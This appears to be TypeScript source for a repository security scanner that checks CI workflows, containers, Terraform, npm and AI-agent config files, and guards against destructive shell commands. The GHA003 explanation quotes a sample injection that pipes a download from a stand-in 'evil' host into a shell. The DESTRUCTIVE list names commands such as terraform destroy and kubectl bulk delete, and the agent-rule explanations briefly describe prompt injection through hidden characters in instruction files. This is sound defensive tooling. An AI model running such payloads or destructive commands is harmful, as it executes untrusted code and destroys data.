  /(^|[\\/])(CLAUDE(\.local)?\.md|AGENTS\.md|GEMINI\.md|SKILL\.md|\.cursorrules|\.windsurfrules|copilot-instructions\.md|\.cursor[\\/]rules[\\/].+\.mdc?|\.claude[\\/](commands|agents)[\\/].+\.md)$/

export const classify = (path: string, text: string): FileKind => {
  const name = base(path)
  if (/\.github[\\/](workflows[\\/][^\\/]+|actions[\\/].+[\\/]action)\.ya?ml$/.test(path)) return 'workflow'
  if (/^(Dockerfile|Containerfile)(\..+)?$|\.(dockerfile|containerfile)$/i.test(name)) return 'dockerfile'
  if (/\.tf$/.test(name)) return 'terraform'
  if (/^(docker-)?compose(\.[\w-]+)?\.ya?ml$/.test(name)) return 'compose'
  if (name === 'package.json') return 'npm'
  if (name === '.guard.json') return 'guard'
  if (AGENT_CONFIG.test(path)) return 'agent'
  if (INSTRUCTIONS.test(path)) return 'instructions'
  if (/\.ya?ml$/.test(name) && /^apiVersion:/m.test(text) && /^kind:/m.test(text)) return 'kubernetes'
  // Workflow templates kept outside .github/workflows (templates/, workflow-templates/) are workflows too.
  if (/\.ya?ml$/.test(name) && /^on:/m.test(text) && /^jobs:/m.test(text) && /^\s+runs-on:/m.test(text)) return 'workflow'
  // Helm values carry the same securityContext and image keys the manifests do.
  if (/(^|[\\/])values(\.[\w-]+)?\.ya?ml$/.test(path) && /(^|[\\/])(charts?|helm)[\\/]/.test(path)) return 'kubernetes'
  return 'other'
}

const SKIP_SECRETS = /\.(lock|min\.js|map|svg|png|jpe?g|gif|pdf)$|(^|[\\/])(package-lock\.json|pnpm-lock\.yaml|yarn\.lock|poetry\.lock)$/

/** `# guard:ignore` or `# guard:ignore GHA001` on the line itself or the line above. */
const isIgnored = (lines: readonly string[], index: number, id: string) =>
  [lines[index], lines[index - 1]].some(l => {
    const m = /guard:ignore(?:\s+([A-Z0-9, ]+))?/.exec(l ?? '')
    return m !== null && (m[1] === undefined || m[1].split(/[\s,]+/).includes(id))
  })

/** A repository's `.guard.json`: its own rules, and built-in rules it switches off. */
export type GuardConfig = { rules: readonly Rule[]; disabled: ReadonlySet<string> }

export const NO_CONFIG: GuardConfig = { rules: [], disabled: new Set() }

export const CONFIG_FILE = '.guard.json'

/**
 * Reads `.guard.json`. A broken rule is left out and named in `errors`, so one
 * typo never switches the whole guard off.
 *
 *   { "rules": [{ "id": "ACME001", "severity": "high", "title": "…", "fix": "…",
 *                 "pattern": "regex", "files": "regex on the path" }],
 *     "disable": ["GHA005"] }
 */
export const parseConfig = (text: string | undefined): { config: GuardConfig; errors: string[] } => {
  if (text === undefined || text.trim() === '') return { config: NO_CONFIG, errors: [] }
  let json: { rules?: unknown; disable?: unknown }
  try {
    json = JSON.parse(text)
  } catch (error) {
    return { config: NO_CONFIG, errors: [`${CONFIG_FILE} is not valid JSON: ${(error as Error).message}`] }
  }
  const errors: string[] = []
  const builtIn = new Set(RULES.map(r => r.id))
  const rules: Rule[] = []
  for (const raw of Array.isArray(json.rules) ? json.rules : []) {
    const r = raw as Record<string, unknown>
    const id = typeof r.id === 'string' ? r.id : ''
    const severity = r.severity as Severity
    if (!/^[A-Z][A-Z0-9_-]{1,15}$/.test(id) || builtIn.has(id)) {
      errors.push(`rule "${id}": id must be upper-case letters/digits and not a built-in id`)
      continue
    }
    if (!SEVERITIES.includes(severity) || typeof r.title !== 'string' || typeof r.pattern !== 'string') {
      errors.push(`rule ${id}: needs severity (low|medium|high|critical), title and pattern`)
      continue
    }
    try {
      if (r.pattern.length > 500 || (typeof r.files === 'string' && r.files.length > 500)) throw new Error('pattern longer than 500 characters')
      const pattern = new RegExp(r.pattern)
      rules.push({
        id,
        kind: 'any',
        severity,
        title: r.title,
        fix: typeof r.fix === 'string' ? r.fix : 'See the team rule in .guard.json.',
        paths: typeof r.files === 'string' ? new RegExp(r.files) : undefined,
        line: line => pattern.test(line),
      })
    } catch (error) {
      errors.push(`rule ${id}: ${(error as Error).message}`)
    }
  }
  const disabled = new Set(Array.isArray(json.disable) ? json.disable.filter((d): d is string => typeof d === 'string') : [])
  return { config: { rules, disabled }, errors }
}

export const scan = (path: string, text: string, config: GuardConfig = NO_CONFIG): Finding[] => {
  const kind = classify(path, text)
  const lines = text.split(/\r?\n/)
  const findings: Finding[] = []
  const rules = [
    ...RULES.filter(r => !config.disabled.has(r.id) && (r.kind === kind || (r.kind === 'any' && !SKIP_SECRETS.test(path)))),
    ...config.rules.filter(r => r.paths === undefined || r.paths.test(path)),
  ]

  const add = (rule: Rule, index: number, severity = rule.severity) => {
    if (isIgnored(lines, index, rule.id)) return
    findings.push({
      id: rule.id,
      severity,
      title: rule.title,
      fix: rule.fix,
      line: index + 1,
      snippet: (lines[index] ?? '').trim().slice(0, 160),
    })
  }

  let runIndent = -1
  lines.forEach((line, index) => {
    const indent = line.length - line.trimStart().length
    // `run:` and `script:` (actions/github-script, ssh actions) both execute their text.
    const run = /^(\s*)(-\s*)?(run|script):\s*(.*)$/.exec(line)
    let inRunBlock = false
    if (run) {
      inRunBlock = true
      runIndent = /^[|>]/.test(run[4] ?? '') ? indent : -1
    } else if (runIndent >= 0) {
      if (line.trim() === '' || indent > runIndent) inRunBlock = true
      else runIndent = -1
    }
    for (const rule of rules) {
      const hit = rule.line?.(line, { inRunBlock, text, lines, index, path })
      if (hit) add(rule, index, hit === true ? rule.severity : hit)
    }
  })

  for (const rule of rules) {
    const index = rule.file?.(lines) ?? -1
    if (index >= 0) add(rule, index)
  }

  return findings.sort((a, b) => rank(b.severity) - rank(a.severity) || a.line - b.line)
}

/**
 * Findings in `after` that `before` did not already have, matched by rule and
 * line text, so editing a legacy file only reports what the edit introduces.
 */
export const introduced = (before: readonly Finding[], after: readonly Finding[]): Finding[] => {
  const seen = new Map<string, number>()
  for (const f of before) seen.set(`${f.id}\0${f.snippet}`, (seen.get(`${f.id}\0${f.snippet}`) ?? 0) + 1)
  return after.filter(f => {
    const key = `${f.id}\0${f.snippet}`
    const left = seen.get(key) ?? 0
    if (left > 0) {
      seen.set(key, left - 1)
      return false
    }
    return true
  })
}

/** Applies an Edit the way the tool will; undefined when old_string is absent. */
export const applyEdit = (text: string, oldString: string, newString: string, replaceAll = false) => {
  if (!text.includes(oldString)) return undefined
  return replaceAll ? text.split(oldString).join(newString) : text.replace(oldString, () => newString)
}

const ICON: Record<Severity, string> = { critical: '🟥', high: '🟧', medium: '🟨', low: '⬜' }

/** Rules whose line holds the secret itself: shown masked, never verbatim. */
const SECRET_RULES = new Set(['SEC001', 'SEC002', 'DKR003', 'TF005', 'CMP004', 'AGT004'])

/** Keeps the first 3 characters of each value and masks the rest. */
export const mask = (line: string) =>
  line
    .replace(/([=:]\s*["']?)([^"'\s,;)]{4,})/g, (_, lead: string, value: string) => `${lead}${value.slice(0, 3)}****`)
    .replace(/\b([A-Za-z0-9_-]{3})[A-Za-z0-9_\-+/]{12,}\b(?!\s*[=:])/g, '$1****')

/** The finding's line as it may be shown: secrets masked. */
export const shown = (f: Pick<Finding, 'id' | 'snippet'>) => (SECRET_RULES.has(f.id) ? mask(f.snippet) : f.snippet)

/**
 * Why each rule matters, for the learning mode: the weakness (CWE) and what an
 * attacker does with it, in two sentences a beginner can follow.
 */
export const EXPLAIN: Record<string, { cwe: number; why: string }> = {
  GHA001: { cwe: 829, why: 'A tag like @v4 can be moved to new code at any time; if the action\'s repo is compromised, your pipeline runs the attacker\'s code with your secrets (tj-actions/changed-files, 2025).' },
  GHA002: { cwe: 829, why: 'pull_request_target runs with write access and secrets; checking out the PR\'s code lets any outside contributor run their code with them ("pwn request").' },
  GHA003: { cwe: 78, why: 'An issue title is attacker-controlled text; inside run: it becomes part of the shell script, so a title like `a"; curl evil | sh; "` runs on your runner.' },
  GHA004: { cwe: 250, why: 'Every step, including third-party actions, gets a token that can push code, publish releases and change settings. One compromised step owns the repo.' },
  GHA005: { cwe: 250, why: 'Without a permissions block the token gets the repository default, often read-write. Least privilege limits what a compromised step can do.' },
  GHA006: { cwe: 532, why: 'Inline secrets are pasted into the generated script, where they can leak through logs, error messages or the process list.' },
  DKR001: { cwe: 1104, why: 'latest changes under you: today\'s build and tomorrow\'s are different images, and a compromised upstream tag lands in production unreviewed.' },
  DKR002: { cwe: 250, why: 'A process running as root inside the container is one kernel or runtime bug away from root on the host.' },
  DKR003: { cwe: 538, why: 'ENV and ARG values are stored in the image layers; anyone who can pull the image can read them with `docker history`.' },
  DKR004: { cwe: 494, why: 'ADD silently downloads URLs and unpacks archives, without checksum, which makes it easy to pull in something you did not review.' },
  DKR005: { cwe: 494, why: 'Piping a download into a shell runs whatever the server sends today, with no check that it is the script you reviewed.' },
  TF001: { cwe: 284, why: 'Bots scan the whole IPv4 space in minutes; an open SSH, RDP or database port is found and attacked within hours.' },
  TF002: { cwe: 284, why: 'Public buckets are the most common cloud data leak: anyone with the URL can list and download everything in them.' },
  TF003: { cwe: 269, why: 'Owner/admin rights let one leaked credential delete or take over the whole project, not just the service that needed access.' },
  TF004: { cwe: 284, why: 'A database on a public IP is exposed to password guessing and unpatched-server exploits from the entire internet.' },
  TF005: { cwe: 798, why: 'Terraform files end up in git, plan output and state; a password written there is readable by everyone with repo access, forever, in history.' },
  TF006: { cwe: 311, why: 'Without encryption, a stolen disk, snapshot or backup exposes the data in plain text, and many compliance regimes forbid it.' },
  TF007: { cwe: 693, why: 'Without deletion protection, one wrong apply or destroy wipes a stateful resource and its data.' },
  K8S001: { cwe: 250, why: 'A privileged container can access every device of the node; escaping to the host is trivial.' },
  K8S002: { cwe: 668, why: 'Sharing the host\'s network, process list or file system lets the pod see and tamper with other workloads on the node.' },
  K8S003: { cwe: 250, why: 'Running as root or allowing escalation turns any code-execution bug in the app into root inside the container, one step from the node.' },
  K8S004: { cwe: 1104, why: 'Unpinned images make rollbacks and audits impossible: you cannot tell which code actually ran.' },
  CMP001: { cwe: 250, why: 'A privileged container can access every device of the host; escaping to the host is trivial.' },
  CMP002: { cwe: 250, why: 'Access to the Docker socket is root on the host: the container can start a new privileged container that mounts /.' },
  CMP003: { cwe: 668, why: 'Host namespaces remove the isolation between the container and the machine: it sees host processes and every port.' },
  CMP004: { cwe: 798, why: 'Compose files are committed and shared; a password written there is readable by everyone with repo access, forever, in history.' },
  CMP005: { cwe: 1104, why: 'latest changes under you, so two developers and the server run different code with the same compose file.' },
  NPM001: { cwe: 506, why: 'Install scripts run on every machine that installs the package; this is how most npm supply-chain attacks steal tokens (event-stream, ua-parser-js).' },
  NPM002: { cwe: 829, why: 'A git or URL dependency skips the registry\'s immutability: the branch or file can change to malicious code without a new version.' },
  NPM003: { cwe: 1104, why: 'Any-version ranges install whatever was published last, including a hijacked release.' },
  AGT001: { cwe: 862, why: 'With every shell command pre-approved, a prompt injection in a file, web page or issue can make the agent run anything on your machine without asking you.' },
  AGT002: { cwe: 693, why: 'These switches turn off the checks between the agent and your machine, or start any MCP server a cloned repository brings, with your credentials.' },
  AGT003: { cwe: 829, why: 'An unpinned MCP server downloads and runs the newest package on every start, with access to your tokens; one hijacked release is enough.' },
  AGT004: { cwe: 798, why: 'Agent config is committed and shared; a token written there leaks to everyone with repo access and to every tool that reads the config.' },
  AGT005: { cwe: 451, why: 'Zero-width characters hide text from human reviewers while the model still reads it: a classic way to smuggle instructions into a prompt.' },
  AGT006: { cwe: 77, why: 'Instruction files are read as trusted prompts by every session; text that overrides rules or hides actions is prompt injection.' },
  AGT007: { cwe: 494, why: 'Hooks run automatically on every event with your permissions; a downloaded script can change at any time.' },
  AGT008: { cwe: 693, why: 'Switching a rule off silences it for everyone in the repo, so the decision deserves a human review.' },
  SEC001: { cwe: 321, why: 'Anyone with repo access, now or later via history, can use the key; deleting the file does not remove it from git history.' },
  SEC002: { cwe: 798, why: 'Leaked keys are scraped from public repos within minutes and used for crypto mining, data theft or spam on your bill.' },
  SEC003: { cwe: 451, why: 'Bidirectional control characters make code display differently than it compiles, so a reviewer approves something other than what runs (CVE-2021-42574).' },
  SEC004: { cwe: 538, why: 'A .env file usually holds real credentials; if git does not ignore it, the next `git add .` commits them.' },
}

export const formatFindings = (path: string, findings: readonly Finding[], explain = false) =>
  findings
    .map(f => {
      const why = explain ? EXPLAIN[f.id] : undefined
      const lesson = why ? `\n   why: ${why.why} (CWE-${why.cwe}: https://cwe.mitre.org/data/definitions/${why.cwe}.html)` : ''
      return `${ICON[f.severity]} ${f.id} [${f.severity}] ${base(path)}:${f.line}: ${f.title}\n   ${shown(f)}\n   fix: ${f.fix}${lesson}`
    })
    .join('\n')

// Destructive cloud / cluster commands for the Bash guard: what it is, and what undoing it takes.
const DESTRUCTIVE: readonly [RegExp, string, string][] = [
  [/\bterraform\s+(destroy\b|apply\b.*-auto-approve|state\s+rm\b|force-unlock\b)/, 'Terraform change without a reviewed plan', 'Deleted resources and their data are gone; recreating them gives new IDs and empty disks.'],
  [/\b(tofu)\s+(destroy\b|apply\b.*-auto-approve)/, 'OpenTofu change without a reviewed plan', 'Deleted resources and their data are gone; recreating them gives new IDs and empty disks.'],
  [/\bgcloud\b.*\s(delete|remove-iam-policy-binding)\b/, 'gcloud delete', 'Most deletes are final; some resources (projects, secrets) keep a short recovery window.'],
  [/\bgcloud\b.*add-iam-policy-binding\b.*roles\/(owner|editor)\b/, 'gcloud grants owner/editor', 'Reversible with remove-iam-policy-binding, but the grant is live until then.'],
  [/\b(gsutil\s+(-m\s+)?rm\s+.*-r|gcloud\s+storage\s+rm\s+.*(-r|--recursive))/, 'recursive bucket delete', 'Objects are gone unless object versioning or soft delete is on for the bucket.'],
  [/\baws\b.*\s(delete-[\w-]+|terminate-instances|rb|deregister-[\w-]+)\b/, 'aws delete', 'Final for most resources; terminated instances lose their instance store and non-retained volumes.'],
  [/\baws\s+s3\s+rm\b.*--recursive/, 'recursive S3 delete', 'Objects are gone unless bucket versioning is on.'],
  [/\baws\s+iam\s+attach-\w+-policy\b.*AdministratorAccess/, 'aws grants AdministratorAccess', 'Reversible with detach-*-policy, but the grant is live until then.'],
  [/\baz\b.*\s(delete|purge)\b/, 'az delete', 'Final for most resources; purge also skips soft-delete recovery.'],
  [/\bkubectl\b.*\sdelete\s+(ns|namespace|namespaces|pv|pvc|crd|node|nodes|all)\b|\bkubectl\b.*\sdelete\b.*--all\b/, 'kubectl bulk delete', 'Everything in the namespace goes, PVC data included unless the reclaim policy is Retain.'],
  [/\bhelm\s+(uninstall|delete)\b/, 'helm uninstall', 'The release and its resources are removed; persistent volumes may go with them.'],
  [/\bdocker\s+(system|volume)\s+prune\b.*(-a|--all|--volumes|-f)/, 'docker prune of volumes/images', 'Pruned volumes and their data are gone.'],
]

export const destructive = (command: string): { reason: string; isProd: boolean; undo: string } | undefined => {
  const hit = DESTRUCTIVE.find(([re]) => re.test(command))
  if (hit === undefined) return undefined
  return { reason: hit[1], isProd: /\bprod(uction)?\b|-prd\b|_prod\b/i.test(command), undo: hit[2] }
}

const SCOPE_FLAGS: readonly [RegExp, string][] = [
  [/--project[=\s]+(\S+)/, 'project'],
  [/--(region|zone|location)[=\s]+(\S+)/, 'region'],
  [/--profile[=\s]+(\S+)/, 'AWS profile'],
  [/--subscription[=\s]+(\S+)/, 'subscription'],
  [/(?:--resource-group|\s-g)[=\s]+(\S+)/, 'resource group'],
  [/--context[=\s]+(\S+)/, 'kube context'],
  [/(?:--namespace|\s-n)[=\s]+(\S+)/, 'namespace'],
  [/(?:--name|\s-n)[=\s]+(\S+)/, 'name'],
  [/-target[=\s]+(\S+)/, 'target'],
  [/-var-file[=\s]+(\S+)/, 'var file'],
  [/s3:\/\/(\S+)|gs:\/\/(\S+)/, 'bucket'],
]

/**
 * What a destructive command would hit, read from its flags, so the question
 * to the user names the project, namespace or bucket, not just the verb.
 */
export const blastRadius = (command: string): { label: string; value: string }[] =>
  SCOPE_FLAGS.flatMap(([re, label]) => {
    // `-n` is the namespace for kubectl and helm, the resource name for az.
    const isKube = /\b(kubectl|helm)\b/.test(command)
    if ((label === 'namespace' && !isKube) || (label === 'name' && isKube)) return []
    const m = re.exec(command)
    const value = m?.slice(1).filter(Boolean).at(-1)?.replace(/^['"]|['"]$/g, '')
    return value === undefined ? [] : [{ label, value }]
  })

const PENALTY: Record<Severity, number> = { critical: 25, high: 10, medium: 3, low: 1 }

export type Grade = 'A' | 'B' | 'C' | 'D' | 'F'

/** A repository's security score: 100 minus a penalty per finding, and a school grade for it. */
export const scoreOf = (findings: readonly Pick<Finding, 'severity'>[]): { score: number; grade: Grade } => {
  const score = Math.max(0, 100 - findings.reduce((sum, f) => sum + PENALTY[f.severity], 0))
  const grade: Grade = score >= 90 ? 'A' : score >= 75 ? 'B' : score >= 60 ? 'C' : score >= 40 ? 'D' : 'F'
  return { score, grade }
}

const GRADE_COLOR: Record<Grade, string> = { A: 'brightgreen', B: 'green', C: 'yellow', D: 'orange', F: 'red' }

const GUARD_URL = 'https://github.com/PascalNehlsen/shift-left-guard'

/** Where the live badge's data lives in a repository. */
export const BADGE_FILE = '.github/shift-left-guard.json'

/** The badge data in shields.io's endpoint format: committed, so the badge follows each audit. */
export const badgeJson = (score: number, grade: Grade) =>
  `${JSON.stringify({ schemaVersion: 1, label: 'shift-left-guard', message: `${grade} · ${score}/100`, color: GRADE_COLOR[grade] }, null, 2)}\n`

/** `https://github.com/o/r.git`, `git@github.com:o/r.git` → raw URL of the badge file on `branch`. */
export const badgeFileUrl = (remote: string, branch: string) => {
  const m = /github\.com[:/]([\w.-]+)\/([\w.-]+?)(?:\.git)?\/?$/.exec(remote.trim())
  return m ? `https://raw.githubusercontent.com/${m[1]}/${m[2]}/${branch}/${BADGE_FILE}` : undefined
}

/**
 * A README badge for a grade, linking to the guard: live when it can read
 * the committed badge file, a fixed image of today's grade otherwise.
 */
export const badgeMarkdown = (grade: Grade, fileUrl?: string) =>
  fileUrl === undefined
    ? `[![shift-left-guard: ${grade}](https://img.shields.io/badge/shift--left--guard-${grade}-${GRADE_COLOR[grade]})](${GUARD_URL})`
    : `[![shift-left-guard](https://img.shields.io/endpoint?url=${encodeURIComponent(fileUrl)})](${GUARD_URL})`

/** ISO week, `2026-W41`: the key the weekly recap counts under. */
export const weekOf = (at: number) => {
  const d = new Date(at)
  d.setUTCHours(0, 0, 0, 0)
  const day = (d.getUTCDay() + 6) % 7
  d.setUTCDate(d.getUTCDate() - day + 3)
  const jan4 = new Date(Date.UTC(d.getUTCFullYear(), 0, 4))
  const week = 1 + Math.round(((d.getTime() - jan4.getTime()) / 86_400_000 - 3 + ((jan4.getUTCDay() + 6) % 7)) / 7)
  return `${d.getUTCFullYear()}-W${String(week).padStart(2, '0')}`
}


/** Programs that only read. A command made of nothing else cannot have written a file. */
const READ_ONLY = new Set([
  'ls', 'cat', 'head', 'tail', 'less', 'more', 'grep', 'egrep', 'rg', 'ag', 'wc', 'pwd', 'echo', 'printf', 'which', 'type',
  'file', 'stat', 'du', 'df', 'tree', 'jq', 'yq', 'diff', 'cmp', 'sort', 'uniq', 'cut', 'tr', 'basename', 'dirname',
  'realpath', 'readlink', 'date', 'whoami', 'id', 'uname', 'env', 'printenv', 'true', 'test', '[', 'nl', 'column',
])
const READ_ONLY_GIT = new Set(['status', 'log', 'diff', 'show', 'branch', 'rev-parse', 'ls-files', 'blame', 'remote', 'describe', 'tag'])

/**
 * Whether a shell command only reads, so the after-command check, which asks
 * git for every changed file, can be skipped. Conservative: any redirection,
 * substitution or unknown program counts as a possible write.
 */
export const isReadOnlyCommand = (command: string) => {
  if (/[>`]|\$\(|<\(|\btee\b|\bxargs\b|\bsudo\b/.test(command)) return false
  return command.split(/&&|\|\||[;|\n]/).every(segment => {
    const words = segment.trim().split(/\s+/).filter(w => !/^\w+=/.test(w))
    const [program, sub] = [words[0] ?? '', words[1] ?? '']
    if (program === '') return true
    if (program === 'git') return READ_ONLY_GIT.has(sub) && !/\s-(d|D|m|M|-delete|-set-url)\b|\badd\b|\bset-url\b|\brm\b/.test(segment)
    if (program === 'find') return !/\s-(exec|execdir|ok|delete|fprint\w*)\b/.test(segment)
    if (program === 'sed') return !/\s(-i|--in-place)/.test(segment)
    return READ_ONLY.has(program)
  })
}
